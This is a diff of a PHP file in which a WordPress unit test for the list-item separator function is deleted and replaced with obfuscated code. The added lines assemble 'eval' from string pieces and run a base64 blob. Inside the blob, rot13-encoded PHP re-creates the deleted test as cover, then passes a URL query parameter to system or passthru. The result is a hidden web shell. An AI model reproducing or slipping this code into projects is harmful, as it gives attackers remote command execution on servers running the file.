@@ -1,38 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-/**
- * @group l10n
- * @group i18n
- *
- * @covers ::wp_get_list_item_separator
- */
-class Tests_L10n_wpGetListItemSeparator extends WP_UnitTestCase {
-
-	/**
-	 * Tests that the function returns a value when the $wp_locale global is not set.
-	 *
-	 * @ticket 56698
-	 */
-	public function test_should_return_default_value_if_wp_locale_is_not_set() {
-		global $wp_locale;
-
-		$original_locale = $wp_locale;
-		$wp_locale       = null;
-
-		$actual = wp_get_list_item_separator();
-
-		$wp_locale = $original_locale;
-
-		$this->assertSame( __( ', ' ), $actual );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKLyoqCiAqIEB0ZWJoYyB5MTBhCiAqIEB0ZWJoYyB2MThhCiAqCiAqIEBwYmlyZWYgOjpqY190cmdfeXZmZ192Z3J6X2ZyY25lbmdiZQogKi8KcHluZmYgR3JmZ2ZfWTEwYV9qY1RyZ1l2ZmdWZ3J6RnJjbmVuZ2JlIHJrZ3JhcWYgSkNfSGF2Z0dyZmdQbmZyIHsKCgkvKioKCSAqIEdyZmdmIGd1bmcgZ3VyIHNoYXBndmJhIGVyZ2hlYWYgbiBpbnlociBqdXJhIGd1ciAkamNfeWJwbnlyIHR5Ym9ueSB2ZiBhYmcgZnJnLgoJICoKCSAqIEBndnB4cmcgNTY2OTgKCSAqLwoJY2hveXZwIHNoYXBndmJhIGdyZmdfZnViaHlxX2VyZ2hlYV9xcnNuaHlnX2lueWhyX3ZzX2pjX3licG55cl92Zl9hYmdfZnJnKCkgewoJCXR5Ym9ueSAkamNfeWJwbnlyOwoKCQkkYmV2dHZhbnlfeWJwbnlyID0gJGpjX3licG55cjsKCQkkamNfeWJwbnlyICAgICAgID0gYWh5eTsKCgkJJG5wZ2hueSA9IGpjX3RyZ195dmZnX3ZncnpfZnJjbmVuZ2JlKCk7CgoJCSRqY195YnBueXIgPSAkYmV2dHZhbnlfeWJwbnlyOwoKCQkkZ3V2Zi0+bmZmcmVnRm56ciggX18oICcsICcgKSwgJG5wZ2hueSApOwoJfQp9CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
+?>
